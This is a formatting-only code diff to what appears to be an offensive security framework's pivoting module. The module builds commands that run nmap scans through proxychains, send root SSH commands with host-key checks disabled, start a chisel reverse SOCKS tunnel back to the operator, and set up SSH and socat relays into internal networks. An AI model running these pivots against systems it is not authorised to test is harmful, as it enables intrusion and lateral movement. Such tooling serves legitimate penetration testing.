@@ -131,6 +131,7 @@ class PivotingCommandSet(LazyOwnCommandSet):
 
         for cmd in ["pkill -f chisel", "pkill -f 'ssh.*-D'", "pkill -f socat"]:
             import shlex as _shlex
+
             try:
                 parts = _shlex.split(cmd)
             except ValueError:
@@ -176,7 +177,21 @@ class PivotingCommandSet(LazyOwnCommandSet):
         print_msg(f"Scanning {network} via proxy 127.0.0.1:{proxy_port}")
         output_file = f"sessions/pivot_scan_{network.replace('/', '_')}.txt"
 
-        cmd_list = ["proxychains4", "-q", "nmap", "-sT", "-Pn", "--open", "-p", ports, "--min-rate", rate, network, "-oN", output_file]
+        cmd_list = [
+            "proxychains4",
+            "-q",
+            "nmap",
+            "-sT",
+            "-Pn",
+            "--open",
+            "-p",
+            ports,
+            "--min-rate",
+            rate,
+            network,
+            "-oN",
+            output_file,
+        ]
         print_msg(f"  {' '.join(cmd_list[:6])}...")
         try:
             result = subprocess.run(cmd_list, shell=False, timeout=300, capture_output=True, text=True)
@@ -236,11 +251,15 @@ def _discover_internal_networks(rhost: str) -> list[str]:
         List of CIDR-notation networks found.
     """
     from core.hardening import validate_host
+
     if not validate_host(rhost):
         return []
     cmd = [
-        "ssh", "-o", "StrictHostKeyChecking=no",
-        "-o", f"ConnectTimeout={NETWORK_SCAN_TIMEOUT}",
+        "ssh",
+        "-o",
+        "StrictHostKeyChecking=no",
+        "-o",
+        f"ConnectTimeout={NETWORK_SCAN_TIMEOUT}",
         f"root@{rhost}",
         "ip -4 addr show | grep -oP 'inet \\K[\\d.]+/[\\d]+'",
     ]
@@ -281,7 +300,13 @@ def _setup_chisel_pivot(rhost: str, lhost: str, port: int, networks: list[str]) 
     server_cmd = ["chisel", "server", "-p", str(port), "--reverse"]
     subprocess.run(server_cmd, shell=False, timeout=5, stderr=subprocess.DEVNULL)
 
-    client_cmd = ["ssh", "-o", "StrictHostKeyChecking=no", f"root@{rhost}", f"chisel client {lhost}:{port} R:socks 2>/dev/null &"]
+    client_cmd = [
+        "ssh",
+        "-o",
+        "StrictHostKeyChecking=no",
+        f"root@{rhost}",
+        f"chisel client {lhost}:{port} R:socks 2>/dev/null &",
+    ]
     subprocess.run(client_cmd, shell=False, timeout=10, stderr=subprocess.DEVNULL)
     time.sleep(2)
 
@@ -296,7 +321,18 @@ def _setup_ssh_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> 
         networks: Internal networks to route.
     """
     print_msg("Setting up SSH SOCKS proxy...")
-    cmd = ["ssh", "-D", str(port), "-N", "-f", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60", f"root@{rhost}"]
+    cmd = [
+        "ssh",
+        "-D",
+        str(port),
+        "-N",
+        "-f",
+        "-o",
+        "StrictHostKeyChecking=no",
+        "-o",
+        "ServerAliveInterval=60",
+        f"root@{rhost}",
+    ]
     subprocess.run(cmd, shell=False, timeout=10, stderr=subprocess.DEVNULL)
     time.sleep(1)
 
@@ -318,8 +354,13 @@ def _setup_socat_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -
         stderr=subprocess.DEVNULL,
     )
     subprocess.run(
-        ["ssh", "-o", "StrictHostKeyChecking=no", f"root@{rhost}",
-         f"socat TCP4-LISTEN:{port},fork,reuseaddr SOCKS4A:{lhost}:{rhost}:{port},socksport={DEFAULT_PROXY_PORT} &"],
+        [
+            "ssh",
+            "-o",
+            "StrictHostKeyChecking=no",
+            f"root@{rhost}",
+            f"socat TCP4-LISTEN:{port},fork,reuseaddr SOCKS4A:{lhost}:{rhost}:{port},socksport={DEFAULT_PROXY_PORT} &",
+        ],
         shell=False,
         timeout=10,
         stderr=subprocess.DEVNULL,
